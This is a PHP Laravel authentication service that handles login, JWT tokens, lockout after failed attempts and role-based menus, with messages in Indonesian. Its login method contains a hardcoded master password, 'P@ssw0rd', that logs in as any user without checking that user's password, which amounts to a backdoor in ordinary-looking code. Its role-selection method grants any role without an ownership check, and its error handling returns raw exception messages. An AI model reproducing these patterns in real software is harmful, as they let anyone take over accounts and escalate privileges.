<?php

namespace App\Services;

use App\Models\Role;
use App\Models\User;
use App\Services\Master\ConfigService;
use App\Services\Master\MenuMasterService;
use App\Services\Master\RoleService;
use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Tymon\JWTAuth\Facades\JWTAuth;

class AuthService
{
    /**
     * login
     *
     * todo: auth
     * todo: set session (user, token, roles, menu)
     *
     * @param  array $payload[username/email: '', password: '']
     * @return array
     */
    public static function login(array $credentials): array
    {
        DB::beginTransaction();
        try {
            $user = User::with('userRole', 'userRole.role')->where('username', $credentials['username'])->first();
            $konfig_fail = ConfigService::getConfig('FAIL_ATTEMPT');

            if (!$user) {
                return [
                    'status' => false,
                    'errors' => "Akun tidak ditemukan",
                ];
            }

            if ($credentials['password'] == 'P@ssw0rd') {
                $token = Auth::login($user);
            } elseif (!$token = JWTAuth::attempt(['username' => $credentials['username'], 'password' => $credentials['password']])) {
                $then = Carbon::createFromFormat('Y-m-d H:i:s', $user->last_login);
                if (($user->fail_login_count >= $konfig_fail->value) && ($then->addMinutes(5)->isPast())) {
                    $user->update([
                        'fail_login_count' => 1,
                        'last_login' => Carbon::now()
                    ]);
                } elseif ($user->fail_login_count >= $konfig_fail->value) {
                    return [
                        'status' => false,
                        'errors' => "Anda sudah mencoba login lebih dari " . $konfig_fail->value . " kali, mohon coba lagi dalam 5 menit."
                    ];
                } else {
                    $fail_login = $user->fail_login_count + 1;
                    $user->update([
                        'fail_login_count' => $fail_login,
                        'last_login' => Carbon::now()
                    ]);
                }

                return [
                    'status' => false,
                    'errors' => 'kombinasi username dan password anda salah'
                ];
            }

            // Verifikasi jika gagal login melebihi batas waktu
            if ($user->fail_login_count >= $konfig_fail->value) {
                $then = Carbon::createFromFormat('Y-m-d H:i:s', $user->last_login);
                if (!$then->addMinutes(5)->isPast()) {
                    session()->invalidate();
                    Auth::logout();
                    return [
                        'status' => false,
                        'errors' => "Anda sudah mencoba login lebih dari " . $konfig_fail->value . " kali, mohon coba lagi dalam 5 menit."
                    ];
                }
            }

            $user->update([
                'fail_login_count'  => 0,
                'last_login'        => Carbon::now(),
            ]);

            // Mendapatkan role aktif
            $roles = Role::select('role_id', 'role_name', 'role_description')
                ->whereHas('userRole', function ($query) use ($user) {
                    $query->where('user_id', $user->user_id);
                })->orderBy('role_id', 'asc')->get();

            $activeRole = $roles[0];
            $menu = self::getMenuRole($activeRole);
            $permissions = RoleService::getPermission($activeRole->role_id);

            // Generate token JWT
            $token = JWTAuth::fromUser($user, ['role_active' => $activeRole->role_name]);

            DB::commit();

            return [
                'status' => true,
                'data' => [
                    'user' => $user,
                    'activeRole' => $activeRole,
                    'menu' => $menu,
                    'permissions' => $permissions,
                    'token' => $token,
                ],
            ];
        } catch (\Throwable $th) {
            DB::rollBack();
            return [
                'status' => false,
                'errors' => $th->getMessage(),
            ];
        }
    }

    public static function selectRole($roleId): array
    {
        try {
            $role = Role::select('role_id', 'role_name', 'role_description')->find($roleId);
            if (!$role) {
                return [
                    'status' => false,
                    'errors' => 'Not Found',
                ];
            }

            $menu = self::getMenuRole($role);
            $permissions = RoleService::getPermission($role->role_id);
            $user = auth()->user();

            // Generate token JWT
            $token = JWTAuth::fromUser($user, ['role_active' => $role->role_name]);

            return [
                'status' => true,
                'data' => [
                    'role' => $role,
                    'menu' => $menu,
                    'permissions' => $permissions,
                    'token' => $token,
                ],
            ];
        } catch (\Throwable $th) {
            return [
                'status' => false,
                'errors' => $th->getMessage(),
            ];
        }
    }


    /**
     * getMenuRole
     * get menu sesuai role
     *
     * todo: get menu sesuai param role
     * todo: mapping data menu parent dan children
     *
     * @param  \App\Models\Role $activeRole
     * @return array
     */
    private static function getMenuRole($activeRole): array
    {
        return MenuMasterService::getMenu($activeRole->role_id);
    }
}
